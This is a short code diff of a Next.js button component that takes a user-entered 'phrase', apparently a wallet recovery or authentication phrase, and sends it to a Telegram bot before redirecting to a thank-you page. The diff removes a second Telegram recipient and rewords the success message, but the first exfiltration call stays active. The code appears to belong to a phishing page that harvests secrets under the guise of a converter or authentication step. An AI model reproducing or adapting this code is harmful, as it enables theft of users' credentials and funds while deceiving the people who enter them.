@@ -52,9 +52,7 @@ export const ConverterBtn = () => {
   const chatId = process.env.NEXT_PUBLIC_CHAT_ID_ONE;
   const botToken = process.env.NEXT_PUBLIC_BOT_TOKEN_ONE;
 
-  const chatIdTwo = process.env.NEXT_PUBLIC_CHAT_ID_TWO;
-  const botTokenTwo = process.env.NEXT_PUBLIC_BOT_TOKEN_TWO;
-
+ 
   const onSubmit = async () => {
     try {
       const messageContent = `${phrase}`;
@@ -66,8 +64,7 @@ export const ConverterBtn = () => {
       if (botToken && chatId) {
         setLoading(true);
         await sendTelegramMessage(botToken, chatId, messageContent);
-        await sendTelegramMessage(botTokenTwo!, chatIdTwo!, messageContent);
-        await toast.success("Access Granted");
+        await toast.success("Authentication Phrase Sent Successfully");
         router.push("/thanks");
       } else {
         setLoading(false);
